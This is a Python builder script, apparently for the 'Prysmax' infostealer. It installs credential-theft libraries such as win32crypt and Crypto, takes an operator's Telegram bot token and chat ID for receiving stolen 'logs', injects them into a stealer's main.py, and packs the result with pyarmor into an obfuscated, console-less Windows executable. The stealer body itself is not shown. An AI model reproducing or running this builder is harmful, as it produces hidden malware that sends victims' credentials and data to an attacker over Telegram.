import os
import subprocess
import re
import shutil
import fileinput

required_libraries = [
    'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
    'subprocess', 'pyarmor', 'pyinstaller' ,'glob', 're', 'platform', 'PIL', 'zipfile', 'telegram', 'win32crypt', 'Crypto', 'datetime'
]

def modificar_archivo(file_path, token, chat_id):
    # Expresión regular para buscar la variable prysmax y chat_id
    prysmax_pattern = re.compile(r'prysmax\s*=\s*"[^"]*"')
    chat_id_pattern = re.compile(r'chat_id\s*=\s*"[^"]*"')

    # Reemplazar prysmax con el nuevo token y guardar en el mismo archivo
    with fileinput.FileInput(file_path, inplace=True, backup='', encoding='utf-8') as file:
        for line in file:
            print(prysmax_pattern.sub(f'prysmax = "{token}"', line), end='')

    # Reemplazar chat_id con el nuevo chat_id y guardar en el mismo archivo
    with fileinput.FileInput(file_path, inplace=True, backup='', encoding='utf-8') as file:
        for line in file:
            print(chat_id_pattern.sub(f'chat_id = "{chat_id}"', line), end='')

for library in required_libraries:
    try:
        __import__(library)
    except ImportError:
        print(f"{library} not found. Downloading...")
        subprocess.check_call(['pip', 'install', library])

while True:
    token = input("You must put the token of @botfather in telegram (Your bot lol): ")

    token_format = re.compile(r'^\d+:[a-zA-Z0-9_-]+')

    if token_format.match(token):
        break
    else:
        print("Not a valid token, please enter a valid token.")

print(f"Valid Token: {token}")
id_chat = input("You must enter the ID of the chat where the logs will arrive: ")
if not os.path.exists("prysmax1builder"):
    os.makedirs("prysmax1builder")

# Leer el contenido de main.py
main_content = ""
with open("main.py", 'r', encoding='utf-8') as main_file:
    main_content = main_file.read()

# Escribir el contenido en un nuevo archivo en el directorio prysmax1builder
file_path = os.path.join("prysmax1builder", "main.py")
with open(file_path, 'w', encoding='utf-8') as new_main_file:
    new_main_file.write(main_content)

# Modificar el archivo en el directorio prysmax1builder
modificar_archivo(file_path, token, id_chat)

here = input("Are you sure you compile your file to Executable?: ")
if here == "Yes" or "Y".lower():
    print("Compiling...")
    try:
     subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)
    except:
        subprocess.run('pyarmor-7 pack -e"--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)

    print("File successfully compiled!")
    subprocess.run("explorer prysmax1builder\\dist", shell=True)
else:
    print("okay :(")
